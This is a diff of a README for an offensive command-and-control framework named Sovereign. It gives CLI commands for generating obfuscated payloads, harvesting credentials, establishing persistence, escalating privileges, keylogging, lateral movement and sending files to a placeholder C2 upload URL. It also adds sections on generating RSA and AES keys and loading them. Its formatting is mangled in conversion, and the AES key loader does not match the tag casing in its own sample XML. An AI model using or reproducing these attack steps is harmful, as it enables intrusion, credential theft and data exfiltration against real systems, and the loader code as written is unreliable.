@@ -1,161 +1,285 @@
-# Sovereign Post-Exploitation Framework
+Sovereign Post-Exploitation Framework
 
 This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.
+Features
 
-## Features
+    Enhanced Evasion Techniques: Polymorphic code, sandbox detection, time-based evasion.
+    Advanced Post-Exploitation Modules: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
+    Secure Communication: Encrypted communication between agent and C2 server.
+    Modular Design: Easily add new modules and functionalities.
+    Logging and Reporting: Detailed logging and report generation.
 
-- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
-- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
-- **Secure Communication**: Encrypted communication between agent and C2 server.
-- **Modular Design**: Easily add new modules and functionalities.
-- **Logging and Reporting**: Detailed logging and report generation.
+Usage
+Setting Up the C2 Server
 
-## Usage
+    Create a Python virtual environment and activate it:
 
-### Setting Up the C2 Server
-
-1. **Create a Python virtual environment and activate it**:
-    ```bash
     python -m venv venv
     source venv/bin/activate  # On Windows: venv\Scripts\activate
-    ```
 
-2. **Install the required dependencies**:
-    ```bash
+    Install the required dependencies:
+
     pip install -r c2_server/requirements.txt
-    ```
 
-3. **Run the C2 server**:
-    ```bash
+    Run the C2 server:
+
     python c2_server/c2_server.py
-    ```
 
-### Using the CLI
+Using the CLI
 
 The CLI provides various commands to interact with the framework.
+List all registered agents:
 
-#### List all registered agents:
-```bash
 python cli/cli.py list_agents
-```
 
-#### Send a command to a specific agent:
-```bash
+
+
+Send a command to a specific agent:
+bash
+
 python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"
-```
 
-#### Generate an obfuscated payload for a specific platform:
-```bash
+Generate an obfuscated payload for a specific platform:
+bash
+
 python cli/cli.py generate_payload --platform PLATFORM
-```
 
-#### Harvest credentials:
-```bash
+Harvest credentials:
+bash
+
 python cli/cli.py harvest_credentials
-```
 
-#### Establish persistence:
-```bash
+Establish persistence:
+bash
+
 python cli/cli.py establish_persistence
-```
 
-#### Escalate privileges:
-```bash
+Escalate privileges:
+bash
+
 python cli/cli.py escalate_privileges
-```
 
-#### Gather system information:
-```bash
+Gather system information:
+bash
+
 python cli/cli.py gather_system_info
-```
 
-#### Exfiltrate data:
-```bash
+Exfiltrate data:
+bash
+
 python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
-```
 
-#### Start keylogger:
-```bash
+Start keylogger:
+bash
+
 python cli/cli.py start_keylogger --log_file_path /path/to/log_file
-```
 
-#### Move laterally:
-```bash
+Move laterally:
+bash
+
 python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
-```
 
-### Example Commands
+Example Commands
 
-1. **Listing all registered agents**:
-    ```bash
-    python cli/cli.py list_agents
-    ```
+    Listing all registered agents:
+    bash
 
-2. **Sending a command to a specific agent**:
-    ```bash
-    python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
-    ```
+python cli/cli.py list_agents
 
-3. **Generating a payload for Windows**:
-    ```bash
-    python cli/cli.py generate_payload --platform windows
-    ```
+Sending a command to a specific agent:
+bash
 
-4. **Harvesting credentials**:
-    ```bash
-    python cli/cli.py harvest_credentials
-    ```
+python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
 
-5. **Establishing persistence**:
-    ```bash
-    python cli/cli.py establish_persistence
-    ```
+Generating a payload for Windows:
+bash
 
-6. **Escalating privileges**:
-    ```bash
-    python cli/cli.py escalate_privileges
-    ```
+python cli/cli.py generate_payload --platform windows
 
-7. **Gathering system information**:
-    ```bash
-    python cli/cli.py gather_system_info
-    ```
+Harvesting credentials:
+bash
 
-8. **Exfiltrating data**:
-    ```bash
-    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
-    ```
+python cli/cli.py harvest_credentials
 
-9. **Starting a keylogger**:
-    ```bash
-    python cli/cli.py start_keylogger --log_file_path /path/to/log_file
-    ```
+Establishing persistence:
+bash
 
-10. **Moving laterally**:
-    ```bash
+python cli/cli.py establish_persistence
+
+Escalating privileges:
+bash
+
+python cli/cli.py escalate_privileges
+
+Gathering system information:
+bash
+
+python cli/cli.py gather_system_info
+
+Exfiltrating data:
+bash
+
+python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
+
+Starting a keylogger:
+bash
+
+python cli/cli.py start_keylogger --log_file_path /path/to/log_file
+
+Moving laterally:
+bash
+
     python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
-    ```
 
-### Logging and Reporting
+Logging and Reporting
 
-Logs are stored in the `c2_server.log` file located in the `c2_server` directory. This file contains detailed information about agent activities and commands executed.
+Logs are stored in the c2_server.log file located in the c2_server directory. This file contains detailed information about agent activities and commands executed.
 
 To generate a report from the logged data, run the following command:
-```bash
+bash
+
 python c2_server/c2_server.py generate_report
-```
-This will create a `report.txt` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.
 
-### Adding New Modules
+This will create a report.txt file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.
+Adding New Modules
 
-To add new post-exploitation modules, create a new Python file in the `c2_server/modules` directory and implement the desired functionality. Update the CLI script to include commands for the new module.
+To add new post-exploitation modules, create a new Python file in the c2_server/modules directory and implement the desired functionality. Update the CLI script to include commands for the new module.
+Key Generation and Conversion
+RSA Key Generation
 
-### Contribution
+To generate a pair of RSA keys, you can use the OpenSSL toolkit. Run the following commands to generate a private key and a public key:
+
+    Generate a private key:
+    sh
+
+openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
+
+Extract the public key from the private key:
+sh
+
+    openssl rsa -pubout -in private_key.pem -out public_key.pem
+
+AES Key Generation
+
+To generate an AES key, you can use OpenSSL as well:
+
+    Generate a 256-bit AES key:
+    sh
+
+    openssl rand -base64 32 > aes_key.txt
+
+Conversion to XML
+
+For certain applications, you may need to convert these keys into XML format. Below are examples of how you might format the keys in XML.
+Example RSA Private Key in XML
+XML
+
+<RSAKeyValue>
+  <Modulus>...</Modulus>
+  <Exponent>...</Exponent>
+  <P>...</P>
+  <Q>...</Q>
+  <DP>...</DP>
+  <DQ>...</DQ>
+  <InverseQ>...</InverseQ>
+  <D>...</D>
+</RSAKeyValue>
+
+Example RSA Public Key in XML
+XML
+
+<RSAKeyValue>
+  <Modulus>...</Modulus>
+  <Exponent>...</Exponent>
+</RSAKeyValue>
+
+Example AES Key in XML
+XML
+
+<KeyValue>
+  <Key>
+    <Algorithm>AES</Algorithm>
+    <Size>256</Size>
+    <Value>Base64EncodedKeyHere</Value>
+  </Key>
+</KeyValue>
+
+Public code references from 1 repository
+Secure Management of Keys
+
+Ensure that keys are not stored in the repository. Instead, load them from secure storage at runtime. Below is an example of how you can load keys in a Python script:
+Python
+
+import os
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+def load_private_key(path):
+    with open(path, 'rb') as key_file:
+        private_key = serialization.load_pem_private_key(
+            key_file.read(),
+            password=None,
+        )
+    return private_key
+
+def load_public_key(path):
+    with open(path, 'rb') as key_file:
+        public_key = serialization.load_pem_public_key(key_file.read())
+    return public_key
+
+def load_aes_key(path):
+    import xml.etree.ElementTree as ET
+    tree = ET.parse(path)
+    root = tree.getroot()
+    aes_key = root.find('value').text
+    return aes_key
+
+private_key_path = os.getenv('PRIVATE_KEY_PATH')
+public_key_path = os.getenv('PUBLIC_KEY_PATH')
+aes_key_path = os.getenv('AES_KEY_PATH')
+
+private_key = load_private_key(private_key_path)
+public_key = load_public_key(public_key_path)
+aes_key = load_aes_key(aes_key_path)
+
+print("Keys loaded successfully.")
+
+Public code references from 1 repository
+Setting Up Environment Variables
+
+You can set up environment variables to point to the key file paths:
+Example .env File
+plaintext
+
+PRIVATE_KEY_PATH=/path/to/private_key.pem
+PUBLIC_KEY_PATH=/path/to/public_key.pem
+AES_KEY_PATH=/path/to/aes_key.xml
+
+Running the Project
+
+To run the project, follow the instructions below:
+
+    Clone the repository:
+    sh
+
+git clone https://github.com/your-repo/Sovereign-C2.git
+cd Sovereign-C2
+
+Install dependencies:
+sh
+
+pip install -r requirements.txt
+
+Run the CLI:
+sh
+
+python cli/cli.py
+
+Set up the environment variables:
+sh
+
+    export $(cat .env | xargs)
+
+Contribution
 
 Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.
-
-### License
-
-This project is licensed under the MIT License.
-
-# By the way, we pwn things.....
